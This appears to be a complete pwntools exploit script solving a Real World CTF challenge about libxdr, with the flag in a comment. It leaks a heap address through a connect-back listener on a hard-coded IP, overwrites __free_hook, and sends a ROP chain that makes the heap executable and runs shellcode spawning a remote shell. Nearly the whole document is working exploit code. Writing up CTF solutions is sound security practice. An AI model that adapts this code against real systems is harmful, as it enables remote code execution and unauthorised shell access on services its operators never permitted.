from pwn import *
import threading

# rwctf{Digging_Into_libxdr}

context.terminal = ['tmux', 'split', '-h']
context.endian = 'big'
context.arch = 'amd64'

result = []
def listener():
    l = listen(10917)
    l.wait_for_connection()
    result.append(l.recvall())

th = threading.Thread(target=listener)
th.start()

r = remote('tcp.realworldctf.com', 10917)
def recvline():
    d = r.recvn(0x1000)
    l = u32(d[:4])
    return d[4:4+l]

r.send(p32(1) + p32(1) + p32(4) + 'a' * 4 + p32(14) + '149.28.204.92\x00')
print recvline()
r.send(p32(4) + p32(0) + p32(4) + 'b' * 4)
print recvline()
r.send(p32(4) + p32(0) + p32(4) + 'c' * 4)
print recvline()

r.send(p32(6) + p32(0))
print recvline()
r.send(p32(6) + p32(1))
print recvline()

r.send(p32(4) + p32(0) + p32(0x2000) + 'B' * 4)
print recvline()

r.send(p32(7) + p32(0))
print recvline()
th.join()

print hexdump(result[0])
heap_ptr = u64(result[0][0x20:0x28], endian='little')
heap_base = heap_ptr & ~0xfff
print 'heap base = %#x' % (heap_base)

free_hook = 0x6BEE98
r.send(p32(4) + p32(0) + p32(0x10) + p64(free_hook, endian='little') + 'd' * 8)
print recvline()
r.send(p32(4) + p32(0) + p32(0x10) + 'e' * 0x10)
print recvline()
r.send(p32(4) + p32(0) + p32(0x10) + 'f' * 0x10)
print recvline()

ldr_rax_rdi_8_call_rax_10 = 0x44d088
xchg = 0x4a9679
rop_addr = heap_ptr + 0x40
pop_rdi = 0x492157
pop_rsi = 0x490773
pop_rsi = 0x490773
pop_rdx = 0x4b184a
pop_rax = 0x477e07
pop_r12_r13_r14_r15 = 0x40067f
syscall = 0x4773C5
rop = ''.join(map(lambda _: p64(_, endian='little'), [
    pop_r12_r13_r14_r15 + 1, rop_addr, xchg,
    pop_rax, 10,
    pop_rdi, heap_base,
    pop_rsi, 0x4000,
    pop_rdx, 7,
    syscall,
    rop_addr + 0x100,
    0x41414141
    ])).ljust(0x100)
rop += asm(shellcraft.sh())
rop = rop.ljust(0x800)
r.send(p32(4) + p32(0) + p32(len(rop)) + rop)
print recvline()

r.send(p32(4) + p32(0) + p32(0x10) + p64(ldr_rax_rdi_8_call_rax_10, endian='little') + 'g' * 8)
print recvline()

r.send(p32(6) + p32(3))

r.interactive()
